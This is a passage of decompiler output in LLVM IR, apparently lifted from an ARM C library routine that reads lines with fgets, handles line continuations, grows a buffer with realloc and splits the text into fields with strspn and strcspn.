  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_14e64, label %dec_label_pc_15174, label %dec_label_pc_14e7c

dec_label_pc_14e7c:                               ; preds = %entry
  %v1_14e7c = urem i32 %arg3, 256
  store i32 %v1_14e7c, i32* @sb, align 4
  %v1_14e80 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v3_14e84 = udiv i32 %v1_14e80, 256
  %v3_14e88 = mul nuw nsw i32 %v1_14e7c, 4
  %v1_14e90 = or i32 %v3_14e88, 1
  %v1_14e9c = and i32 %arg3, 131072
  %v1_14ea0 = add nsw i32 %v1_14e7c, -1
  %v1_14eac = and i32 %arg3, 262144
  store i32 %v1_14eac, i32* %r2.global-to-local, align 4
  %v1_14eb0 = and i32 %arg3, 65536
  store i32 %v1_14eb0, i32* %r3.global-to-local, align 4
  store i32 %v1_14eb0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_14ec0 = add i32 %arg4, 1
  store i32 %v1_14ec0, i32* @sl, align 4
  %v2_15038 = icmp eq i32 %v1_14e9c, 0
  %v1_15090 = inttoptr i32 %arg2 to i32*
  %v2_150a8 = icmp eq i32 %v1_14eac, 0
  br label %dec_label_pc_14ec4

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14ec4.backedge, %dec_label_pc_14e7c
  %v2_14ee0 = phi i32 [ %v0_14ec4.pre, %dec_label_pc_14ec4.backedge ], [ %tmp, %dec_label_pc_14e7c ]
  %v1_14ec4 = add i32 %v2_14ee0, 4
  %v2_14ec4 = inttoptr i32 %v1_14ec4 to i32*
  %v3_14ec4 = load i32, i32* %v2_14ec4, align 4
  store i32 %v3_14ec4, i32* %r3.global-to-local, align 4
  %v2_14ec8 = icmp eq i32 %v3_14ec4, 0
  store i1 %v2_14ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ec8, label %dec_label_pc_14ed0, label %dec_label_pc_14f18

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ec4
  %v1_14ed0 = add i32 %v2_14ee0, 16
  %v2_14ed0 = inttoptr i32 %v1_14ed0 to i32*
  %v3_14ed0 = load i32, i32* %v2_14ed0, align 4
  store i32 %v3_14ed0, i32* %r3.global-to-local, align 4
  %v2_14ed4 = icmp eq i32 %v3_14ed0, 0
  store i1 %v2_14ed4, i1* %cpsr_z.global-to-local, align 1
  %v1_14ed8 = add i32 %v2_14ee0, 8
  %v2_14ed8 = inttoptr i32 %v1_14ed8 to i32*
  %v3_14ed8 = load i32, i32* %v2_14ed8, align 4
  store i32 %v3_14ed8, i32* %r3.global-to-local, align 4
  br i1 %v2_14ed4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_14ed0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_14ed0, align 4
  %v0_14ee4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_14ed0, %bb
  %v0_14ee4 = phi i32 [ %v0_14ee4.pre, %bb ], [ %v3_14ed8, %dec_label_pc_14ed0 ]
  %v2_14ee4 = icmp eq i32 %v0_14ee4, 0
  store i1 %v2_14ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ee4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_14e90, i32* %r3.global-to-local, align 4
  %v2_14eec = load i32, i32* @r5, align 4
  %v3_14eec = add i32 %v2_14eec, 8
  %v4_14eec = inttoptr i32 %v3_14eec to i32*
  store i32 %v1_14e90, i32* %v4_14eec, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_14ef0 = load i32, i32* @r5, align 4
  %v1_14ef0 = add i32 %v0_14ef0, 16
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i32*
  %v3_14ef0 = load i32, i32* %v2_14ef0, align 4
  store i32 %v3_14ef0, i32* %r0.global-to-local, align 4
  %v1_14ef4 = add i32 %v0_14ef0, 8
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  store i32 %v3_14ef4, i32* %r3.global-to-local, align 4
  %v2_14ef8 = add i32 %v3_14ef4, %v3_14ef0
  store i32 %v2_14ef8, i32* @r0, align 4
  %v0_14efc = call i32 @malloc()
  store i32 %v0_14efc, i32* %r0.global-to-local, align 4
  %v2_14f00 = icmp eq i32 %v0_14efc, 0
  store i1 %v2_14f00, i1* %cpsr_z.global-to-local, align 1
  %v1_14f04 = load i32, i32* @r5, align 4
  %v2_14f04 = add i32 %v1_14f04, 4
  %v3_14f04 = inttoptr i32 %v2_14f04 to i32*
  store i32 %v0_14efc, i32* %v3_14f04, align 4
  br i1 %v2_14f00, label %dec_label_pc_15174, label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %.thread
  %v0_14f0c = load i32, i32* @r5, align 4
  %v1_14f0c = add i32 %v0_14f0c, 20
  %v2_14f0c = inttoptr i32 %v1_14f0c to i32*
  %v3_14f0c = load i32, i32* %v2_14f0c, align 4
  %v1_14f10 = or i32 %v3_14f0c, 1
  store i32 %v1_14f10, i32* %r3.global-to-local, align 4
  store i32 %v1_14f10, i32* %v2_14f0c, align 4
  %v0_14f18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14f18

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14ec4, %dec_label_pc_14f0c
  %v1_14f20 = phi i32 [ %v2_14ee0, %dec_label_pc_14ec4 ], [ %v0_14f18.pre, %dec_label_pc_14f0c ]
  %v1_14f18 = add i32 %v1_14f20, 4
  %v2_14f18 = inttoptr i32 %v1_14f18 to i32*
  %v3_14f18 = load i32, i32* %v2_14f18, align 4
  store i32 %v3_14f18, i32* %r2.global-to-local, align 4
  %v4_14f18 = add i32 %v1_14f20, 8
  %v5_14f18 = inttoptr i32 %v4_14f18 to i32*
  %v6_14f18 = load i32, i32* %v5_14f18, align 4
  %v2_14f1c = add i32 %v6_14f18, %v3_14f18
  store i32 %v2_14f1c, i32* %r3.global-to-local, align 4
  %v2_14f20 = add i32 %v1_14f20, 12
  %v3_14f20 = inttoptr i32 %v2_14f20 to i32*
  store i32 %v2_14f1c, i32* %v3_14f20, align 4
  %v0_14f24 = load i32, i32* @fp, align 4
  store i32 %v0_14f24, i32* @r6, align 4
  br label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14fb4, %dec_label_pc_14fa0, %dec_label_pc_14f18
  %v0_14f30 = phi i32 [ %v0_14f24, %dec_label_pc_14f18 ], [ %v1_14fa0, %dec_label_pc_14fa0 ], [ %v0_14f30.pre.pre, %dec_label_pc_14fb4 ]
  %v0_14f28 = load i32, i32* @r5, align 4
  %v1_14f28 = add i32 %v0_14f28, 12
  store i32 %v1_14f28, i32* %r0.global-to-local, align 4
  %v1_14f2c = inttoptr i32 %v1_14f28 to i32*
  %v2_14f2c = load i32, i32* %v1_14f2c, align 4
  store i32 %v2_14f2c, i32* %r0.global-to-local, align 4
  %v3_14f2c = add i32 %v0_14f28, 16
  %v4_14f2c = inttoptr i32 %v3_14f2c to i32*
  %v5_14f2c = load i32, i32* %v4_14f2c, align 4
  %v2_14f30 = add i32 %v2_14f2c, %v0_14f30
  store i32 %v2_14f30, i32* %r0.global-to-local, align 4
  %v2_14f34 = sub i32 %v5_14f2c, %v0_14f30
  %v1_14f38 = inttoptr i32 %v0_14f28 to i32*
  %v2_14f38 = load i32, i32* %v1_14f38, align 4
  store i32 %v2_14f38, i32* %r2.global-to-local, align 4
  %v3_14f3c = call i32 @fgets(i32 %v2_14f30, i32 %v2_14f34, i32 %v2_14f38)
  store i32 %v3_14f3c, i32* %r0.global-to-local, align 4
  store i32 %v3_14f3c, i32* %r4.global-to-local, align 4
  %v2_14f40 = icmp eq i32 %v3_14f3c, 0
  store i1 %v2_14f40, i1* %cpsr_z.global-to-local, align 1
  %v0_14f48 = load i32, i32* @r5, align 4
  %v1_14f48 = add i32 %v0_14f48, 12
  br i1 %v2_14f40, label %dec_label_pc_14f48, label %dec_label_pc_14f60

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14f28
  store i32 %v1_14f48, i32* %r0.global-to-local, align 4
  %v1_14f4c = inttoptr i32 %v1_14f48 to i32*
  %v2_14f4c = load i32, i32* %v1_14f4c, align 4
  store i32 %v2_14f4c, i32* %r0.global-to-local, align 4
  %v3_14f4c = add i32 %v0_14f48, 16
  %v4_14f4c = inttoptr i32 %v3_14f4c to i32*
  %v5_14f4c = load i32, i32* %v4_14f4c, align 4
  store i32 %v5_14f4c, i32* %r2.global-to-local, align 4
  %v3_14f54 = inttoptr i32 %v2_14f4c to i8*
  %v4_14f54 = call i32 @__GI_memset(i8* %v3_14f54, i32 0, i32 %v5_14f4c)
  store i32 %v4_14f54, i32* %r0.global-to-local, align 4
  %v0_14f58 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15178

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f28
  %v2_14f60 = inttoptr i32 %v1_14f48 to i32*
  %v3_14f60 = load i32, i32* %v2_14f60, align 4
  store i32 %v3_14f60, i32* @r4, align 4
  %v1_14f64 = load i32, i32* @r6, align 4
  %v2_14f64 = add i32 %v1_14f64, %v3_14f60
  %v3_14f64 = inttoptr i32 %v2_14f64 to i8*
  store i32 %v2_14f64, i32* %r0.global-to-local, align 4
  %v3_14f68 = call i32 @strlen(i8* %v3_14f64)
  %v0_14f70 = load i32, i32* @r6, align 4
  %v2_14f70 = add i32 %v0_14f70, %v3_14f68
  store i32 %v2_14f70, i32* @r6, align 4
  %v0_14f74 = load i32, i32* @r4, align 4
  store i32 %v0_14f74, i32* @r0, align 4
  %v2_14f78 = call i32 @__GI_strchr(i32 %v0_14f74, i32 10)
  store i32 %v2_14f78, i32* %r0.global-to-local, align 4
  %v2_14f7c = icmp eq i32 %v2_14f78, 0
  store i1 %v2_14f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f7c, label %dec_label_pc_14fa8, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f60
  %v1_14f84 = inttoptr i32 %v2_14f78 to i8*
  %v2_14f84 = load i8, i8* %v1_14f84, align 1
  %v3_14f84 = zext i8 %v2_14f84 to i32
  %v1_14f88 = add nuw nsw i32 %v3_14f84, 255
  %v1_14f8c = urem i32 %v1_14f88, 256
  store i32 %v1_14f8c, i32* %r3.global-to-local, align 4
  %v7_14f90 = icmp eq i32 %v1_14f8c, 92
  store i1 %v7_14f90, i1* %cpsr_z.global-to-local, align 1
  %v1_14f94 = trunc i32 %v1_14f88 to i8
  store i8 %v1_14f94, i8* %v1_14f84, align 1
  %v0_14f98 = load i32, i32* @r6, align 4
  %v1_14f98 = add i32 %v0_14f98, -1
  store i32 %v1_14f98, i32* @r6, align 4
  %v0_14f9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f9c, label %dec_label_pc_14fa0, label %dec_label_pc_1502c

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f84
  %v1_14fa0 = add i32 %v0_14f98, -2
  store i32 %v1_14fa0, i32* @r6, align 4
  br label %dec_label_pc_14f28

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f60
  %v0_14fa8 = load i32, i32* @r5, align 4
  %v1_14fa8 = add i32 %v0_14fa8, 20
  %v2_14fa8 = inttoptr i32 %v1_14fa8 to i32*
  %v3_14fa8 = load i32, i32* %v2_14fa8, align 4
  store i32 %v3_14fa8, i32* %r3.global-to-local, align 4
  %v2_14fac = icmp eq i32 %v3_14fa8, 0
  store i1 %v2_14fac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fac, label %dec_label_pc_14fe4, label %dec_label_pc_14fb4

dec_label_pc_14fb4:                               ; preds = %dec_label_pc_14fa8
  %v1_14fb4 = add i32 %v0_14fa8, 16
  %v2_14fb4 = inttoptr i32 %v1_14fb4 to i32*
  %v3_14fb4 = load i32, i32* %v2_14fb4, align 4
  store i32 %v3_14fb4, i32* %r3.global-to-local, align 4
  %v1_14fb8 = add i32 %v0_14fa8, 8
  %v2_14fb8 = inttoptr i32 %v1_14fb8 to i32*
  %v3_14fb8 = load i32, i32* %v2_14fb8, align 4
  %v1_14fbc = add i32 %v3_14fb4, 4096
  store i32 %v1_14fbc, i32* %r3.global-to-local, align 4
  %v2_14fc0 = add i32 %v3_14fb8, %v1_14fbc
  store i32 %v1_14fbc, i32* %v2_14fb4, align 4
  %v0_14fc8 = load i32, i32* @r5, align 4
  %v1_14fc8 = add i32 %v0_14fc8, 4
  %v2_14fc8 = inttoptr i32 %v1_14fc8 to i32*
  %v3_14fc8 = load i32, i32* %v2_14fc8, align 4
  store i32 %v3_14fc8, i32* %r0.global-to-local, align 4
  %v4_14fcc = inttoptr i32 %v3_14fc8 to i32*
  %v5_14fcc = call i32 @realloc(i32* %v4_14fcc, i32 %v2_14fc0, i32 %v2_14f38, i32 %v1_14fbc)
  store i32 %v5_14fcc, i32* %r0.global-to-local, align 4
  %v0_14fd0 = load i32, i32* @r5, align 4
  %v1_14fd0 = add i32 %v0_14fd0, 8
  %v2_14fd0 = inttoptr i32 %v1_14fd0 to i32*
  %v3_14fd0 = load i32, i32* %v2_14fd0, align 4
  %v2_14fd4 = add i32 %v3_14fd0, %v5_14fcc
  store i32 %v2_14fd4, i32* %r3.global-to-local, align 4
  %v2_14fd8 = add i32 %v0_14fd0, 12
  %v3_14fd8 = inttoptr i32 %v2_14fd8 to i32*
  store i32 %v2_14fd4, i32* %v3_14fd8, align 4
  %v1_14fdc = load i32, i32* @r5, align 4
  %v2_14fdc = add i32 %v1_14fdc, 4
  %v3_14fdc = inttoptr i32 %v2_14fdc to i32*
  store i32 %v5_14fcc, i32* %v3_14fdc, align 4
  %v0_14f30.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14f28

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fa8, %.dec_label_pc_14fe4_crit_edge
  %v0_14fe4 = phi i32 [ %v0_14fe4.pre, %.dec_label_pc_14fe4_crit_edge ], [ %v0_14fa8, %dec_label_pc_14fa8 ]
  %v1_14fe4 = inttoptr i32 %v0_14fe4 to i32*
  %v2_14fe4 = load i32, i32* %v1_14fe4, align 4
  store i32 %v2_14fe4, i32* @r1, align 4
  %v1_14fe8 = add i32 %v2_14fe4, 52
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i32*
  %v3_14fe8 = load i32, i32* %v2_14fe8, align 4
  store i32 %v3_14fe8, i32* %r3.global-to-local, align 4
  %v2_14fec = icmp eq i32 %v3_14fe8, 0
  store i1 %v2_14fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fec, label %dec_label_pc_15018, label %dec_label_pc_14ff4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fe4
  %v1_14ff4 = add i32 %v2_14fe4, 16
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i32*
  %v3_14ff4 = load i32, i32* %v2_14ff4, align 4
  store i32 %v3_14ff4, i32* %r2.global-to-local, align 4
  %v1_14ff8 = add i32 %v2_14fe4, 24
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i32*
  %v3_14ff8 = load i32, i32* %v2_14ff8, align 4
  store i32 %v3_14ff8, i32* %r3.global-to-local, align 4
  %v3_14ffc = icmp ult i32 %v3_14ff4, %v3_14ff8
  %v9_14ffc = icmp eq i32 %v3_14ff4, %v3_14ff8
  store i1 %v9_14ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14ffc, label %dec_label_pc_15020thread-pre-split, label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14ff4
  store i32 %v2_14fe4, i32* %r0.global-to-local, align 4
  %v1_15010 = inttoptr i32 %v2_14fe4 to i16*
  %v2_15010 = call i32 @getc_unlocked(i16* %v1_15010)
  store i32 %v2_15010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15020

dec_label_pc_15018:                               ; preds = %dec_label_pc_14fe4
  store i32 %v2_14fe4, i32* %r0.global-to-local, align 4
  %v1_1501c = call i32 @__GI_fgetc(i32 %v2_14fe4)
  store i32 %v1_1501c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15020

dec_label_pc_15020thread-pre-split:               ; preds = %dec_label_pc_14ff4
  %v2_15000 = inttoptr i32 %v3_14ff4 to i8*
  %v3_15000 = load i8, i8* %v2_15000, align 1
  %v4_15000 = zext i8 %v3_15000 to i32
  store i32 %v4_15000, i32* %r0.global-to-local, align 4
  %v6_15000 = add i32 %v3_14ff4, 1
  store i32 %v6_15000, i32* %r2.global-to-local, align 4
  store i32 %v6_15000, i32* %v2_14ff4, align 4
  %v0_15020.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_15020thread-pre-split, %dec_label_pc_1500c, %dec_label_pc_15018
  %v1_15024 = phi i32 [ %v0_15020.pr, %dec_label_pc_15020thread-pre-split ], [ %v2_15010, %dec_label_pc_1500c ], [ %v1_1501c, %dec_label_pc_15018 ]
  %v7_15020 = icmp eq i32 %v1_15024, 10
  store i1 %v7_15020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15020, label %dec_label_pc_1502c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15020
  %v8_15024 = icmp eq i32 %v1_15024, -1
  store i1 %v8_15024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15024, label %dec_label_pc_1502c.loopexit, label %.dec_label_pc_14fe4_crit_edge

.dec_label_pc_14fe4_crit_edge:                    ; preds = %bb66
  %v0_14fe4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_1502c.loopexit:                      ; preds = %bb66, %dec_label_pc_15020
  %v0_1502c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_14f84, %dec_label_pc_1502c.loopexit
  %v0_1502c = phi i32 [ %v0_1502c.pre, %dec_label_pc_1502c.loopexit ], [ %v1_14f98, %dec_label_pc_14f84 ]
  %v7_1502c = icmp eq i32 %v0_1502c, -1
  store i1 %v7_1502c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1502c, label %dec_label_pc_15174, label %dec_label_pc_15034

dec_label_pc_15034:                               ; preds = %dec_label_pc_1502c
  store i32 %v1_14e9c, i32* %r3.global-to-local, align 4
  store i1 %v2_15038, i1* %cpsr_z.global-to-local, align 1
  %v0_1503c = load i32, i32* @r5, align 4
  %v1_1503c = add i32 %v0_1503c, 12
  %v2_1503c = inttoptr i32 %v1_1503c to i32*
  %v3_1503c = load i32, i32* %v2_1503c, align 4
  store i32 %v3_1503c, i32* @r4, align 4
  br i1 %v2_15038, label %dec_label_pc_15054, label %dec_label_pc_15044

dec_label_pc_15044:                               ; preds = %dec_label_pc_15034
  store i32 %v3_1503c, i32* @r0, align 4
  %v0_15048 = load i32, i32* @sl, align 4
  %v2_1504c = inttoptr i32 %v3_1503c to i8*
  %v3_1504c = call i32 @__GI_strspn(i8* %v2_1504c, i32 %v0_15048)
  store i32 %v3_1504c, i32* %r0.global-to-local, align 4
  %v0_15050 = load i32, i32* @r4, align 4
  %v2_15050 = add i32 %v0_15050, %v3_1504c
  store i32 %v2_15050, i32* @r4, align 4
  br label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_15034, %dec_label_pc_15044
  %v0_15054 = phi i32 [ %v3_1503c, %dec_label_pc_15034 ], [ %v2_15050, %dec_label_pc_15044 ]
  %v1_15054 = inttoptr i32 %v0_15054 to i8*
  %v2_15054 = load i8, i8* %v1_15054, align 1
  %v3_15054 = zext i8 %v2_15054 to i32
  store i32 %v3_15054, i32* %r2.global-to-local, align 4
  %v2_15058 = icmp eq i8 %v2_15054, 0
  store i1 %v2_15058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15058, label %dec_label_pc_14ec4.backedge, label %dec_label_pc_15060

dec_label_pc_14ec4.backedge:                      ; preds = %dec_label_pc_15054, %dec_label_pc_15060, %dec_label_pc_1516c
  %v0_14ec4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14ec4

dec_label_pc_15060:                               ; preds = %dec_label_pc_15054
  %v0_15060 = load i32, i32* @r7, align 4
  %v1_15060 = inttoptr i32 %v0_15060 to i8*
  %v2_15060 = load i8, i8* %v1_15060, align 1
  %v3_15060 = zext i8 %v2_15060 to i32
  store i32 %v3_15060, i32* %r3.global-to-local, align 4
  %v9_15064 = icmp eq i8 %v2_15060, %v2_15054
  store i1 %v9_15064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15064, label %dec_label_pc_14ec4.backedge, label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15060
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15070 = load i32, i32* @r5, align 4
  %v1_15070 = add i32 %v0_15070, 4
  %v2_15070 = inttoptr i32 %v1_15070 to i32*
  %v3_15070 = load i32, i32* %v2_15070, align 4
  store i32 %v3_15070, i32* %r0.global-to-local, align 4
  %v0_15074 = load i32, i32* @fp, align 4
  store i32 %v3_15070, i32* %v1_15090, align 4
  store i32 %v3_14e88, i32* %r2.global-to-local, align 4
  %v3_15080 = inttoptr i32 %v3_15070 to i8*
  %v4_15080 = call i32 @__GI_memset(i8* %v3_15080, i32 %v0_15074, i32 %v3_14e88)
  store i32 %v4_15080, i32* %r0.global-to-local, align 4
  %v0_15084 = load i32, i32* @fp, align 4
  store i32 %v0_15084, i32* @r6, align 4
  %v0_1514412 = load i32, i32* @r4, align 4
  %v1_1514413 = inttoptr i32 %v0_1514412 to i8*
  %v2_1514414 = load i8, i8* %v1_1514413, align 1
  %v3_1514415 = zext i8 %v2_1514414 to i32
  store i32 %v3_1514415, i32* %r2.global-to-local, align 4
  %v2_1514816 = icmp eq i8 %v2_1514414, 0
  store i1 %v2_1514816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1514816, label %dec_label_pc_15160, label %dec_label_pc_15150

dec_label_pc_1508c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15090 = load i32, i32* %v1_15090, align 4
  store i32 %v2_15090, i32* %r3.global-to-local, align 4
  store i32 %v1_14ea0, i32* %r2.global-to-local, align 4
  %v9_15098 = icmp eq i32 %v2_1509c, %v1_14ea0
  store i1 %v9_15098, i1* %cpsr_z.global-to-local, align 1
  %v5_1509c = mul i32 %v2_1509c, 4
  %v6_1509c = add i32 %v2_15090, %v5_1509c
  %v7_1509c = inttoptr i32 %v6_1509c to i32*
  store i32 %v0_1509c, i32* %v7_1509c, align 4
  br i1 %v9_15098, label %dec_label_pc_150a4, label %dec_label_pc_150b0

dec_label_pc_150a4:                               ; preds = %dec_label_pc_1508c
  store i32 %v1_14eac, i32* %r3.global-to-local, align 4
  store i1 %v2_150a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150a8, label %dec_label_pc_150b0, label %dec_label_pc_150d0

dec_label_pc_150b0:                               ; preds = %dec_label_pc_150a4, %dec_label_pc_1508c
  %v0_150b0 = load i32, i32* @r7, align 4
  %v1_150b0 = inttoptr i32 %v0_150b0 to i8*
  %v2_150b0 = load i8, i8* %v1_150b0, align 1
  %v3_150b0 = zext i8 %v2_150b0 to i32
  store i32 %v3_150b0, i32* %r3.global-to-local, align 4
  %v2_150b4 = icmp eq i8 %v2_150b0, 0
  store i1 %v2_150b4, i1* %cpsr_z.global-to-local, align 1
  %v0_150b8 = load i32, i32* @r4, align 4
  store i32 %v0_150b8, i32* @r0, align 4
  %v1_150bc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_150b4, i32 %v1_150bc, i32 %v0_150b0
  store i32 %storemerge, i32* @r1, align 4
  %v0_150c4 = call i32 @strcspn()
  store i32 %v0_150c4, i32* %r0.global-to-local, align 4
  %v0_150c8 = load i32, i32* @r4, align 4
  %v2_150c8 = add i32 %v0_150c8, %v0_150c4
  store i32 %v2_150c8, i32* @r4, align 4
  br label %dec_label_pc_15108

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150a4
  %v0_150d0 = load i32, i32* @r4, align 4
  store i32 %v0_150d0, i32* @r0, align 4
  %v0_150d4 = load i32, i32* @r7, align 4
  %v1_150d4 = inttoptr i32 %v0_150d4 to i8*
  %v2_150d4 = load i8, i8* %v1_150d4, align 1
  %v3_150d4 = zext i8 %v2_150d4 to i32
  %v5_150d8 = call i32 @__GI_strchrnul(i32 %v0_150d0, i32 %v3_150d4, i32 %v1_14ea0, i32 %v1_14eac)
  store i32 %v5_150d8, i32* %r0.global-to-local, align 4
  store i32 %v1_14e9c, i32* %r2.global-to-local, align 4
  store i1 %v2_15038, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_150d8, i32* @r4, align 4
  br i1 %v2_15038, label %dec_label_pc_15108, label %dec_label_pc_150f4

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150f4
  %v1_150f0 = add i32 %v0_15108.pre, -1
  store i32 %v1_150f0, i32* @r4, align 4
  br label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150d0, %dec_label_pc_150f0
  %v0_150f4 = phi i32 [ %v1_150f0, %dec_label_pc_150f0 ], [ %v5_150d8, %dec_label_pc_150d0 ]
  %v1_150f4 = add i32 %v0_150f4, -1
  %v2_150f4 = inttoptr i32 %v1_150f4 to i8*
  %v3_150f4 = load i8, i8* %v2_150f4, align 1
  %v4_150f4 = zext i8 %v3_150f4 to i32
  %v0_150f8 = load i32, i32* @sl, align 4
  store i32 %v0_150f8, i32* @r0, align 4
  %v2_150fc = call i32 @__GI_strchr(i32 %v0_150f8, i32 %v4_150f4)
  store i32 %v2_150fc, i32* %r0.global-to-local, align 4
  %v2_15100 = icmp eq i32 %v2_150fc, 0
  store i1 %v2_15100, i1* %cpsr_z.global-to-local, align 1
  %v0_15108.pre = load i32, i32* @r4, align 4
  br i1 %v2_15100, label %dec_label_pc_15108, label %dec_label_pc_150f0

dec_label_pc_15108:                               ; preds = %dec_label_pc_150f4, %dec_label_pc_150d0, %dec_label_pc_150b0
  %v3_15114 = phi i32 [ %v5_150d8, %dec_label_pc_150d0 ], [ %v2_150c8, %dec_label_pc_150b0 ], [ %v0_15108.pre, %dec_label_pc_150f4 ]
  %v1_15108 = inttoptr i32 %v3_15114 to i8*
  %v2_15108 = load i8, i8* %v1_15108, align 1
  %v3_15108 = zext i8 %v2_15108 to i32
  store i32 %v3_15108, i32* %r2.global-to-local, align 4
  %v0_1510c = load i32, i32* @r7, align 4
  %v1_1510c = inttoptr i32 %v0_1510c to i8*
  %v2_1510c = load i8, i8* %v1_1510c, align 1
  %v3_1510c = zext i8 %v2_1510c to i32
  store i32 %v3_1510c, i32* %r3.global-to-local, align 4
  %v9_15110 = icmp eq i8 %v2_1510c, %v2_15108
  store i1 %v9_15110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15110, label %bb69, label %dec_label_pc_1511c

bb69:                                             ; preds = %dec_label_pc_15108
  %v1_15114 = load i32, i32* @fp, align 4
  %v2_15114 = trunc i32 %v1_15114 to i8
  store i8 %v2_15114, i8* %v1_15108, align 1
  %v0_15118.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15118.pr, label %bb71, label %.dec_label_pc_1511c_crit_edge

.dec_label_pc_1511c_crit_edge:                    ; preds = %bb69
  %v0_1511c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1511c

dec_label_pc_1511c:                               ; preds = %.dec_label_pc_1511c_crit_edge, %dec_label_pc_15108
  %v0_1511c = phi i32 [ %v0_1511c.pre, %.dec_label_pc_1511c_crit_edge ], [ %v3_15108, %dec_label_pc_15108 ]
  %v2_1511c = icmp eq i32 %v0_1511c, 0
  store i1 %v2_1511c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1511c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1511c
  %v1_15120 = load i32, i32* @fp, align 4
  %v2_15120 = trunc i32 %v1_15120 to i8
  %v3_15120 = load i32, i32* @r4, align 4
  %v4_15120 = inttoptr i32 %v3_15120 to i8*
  store i8 %v2_15120, i8* %v4_15120, align 1
  %v5_15120 = load i32, i32* @r4, align 4
  %v6_15120 = add i32 %v5_15120, 1
  store i32 %v6_15120, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1511c, %bb70
  %v2_15124 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15124, i32* %r3.global-to-local, align 4
  %v2_15128 = icmp eq i32 %v2_15124, 0
  store i1 %v2_15128, i1* %cpsr_z.global-to-local, align 1
  %v0_15144.pre = load i32, i32* @r4, align 4
  br i1 %v2_15128, label %dec_label_pc_15140, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %bb71
  store i32 %v0_15144.pre, i32* @r0, align 4
  %v0_15134 = load i32, i32* @sl, align 4
  %v2_15138 = inttoptr i32 %v0_15144.pre to i8*
  %v3_15138 = call i32 @__GI_strspn(i8* %v2_15138, i32 %v0_15134)
  store i32 %v3_15138, i32* %r0.global-to-local, align 4
  %v0_1513c = load i32, i32* @r4, align 4
  %v2_1513c = add i32 %v0_1513c, %v3_15138
  store i32 %v2_1513c, i32* @r4, align 4
  br label %dec_label_pc_15140

dec_label_pc_15140:                               ; preds = %bb71, %dec_label_pc_15130
  %v0_15144 = phi i32 [ %v2_1513c, %dec_label_pc_15130 ], [ %v0_15144.pre, %bb71 ]
  %v0_15140 = load i32, i32* @r6, align 4
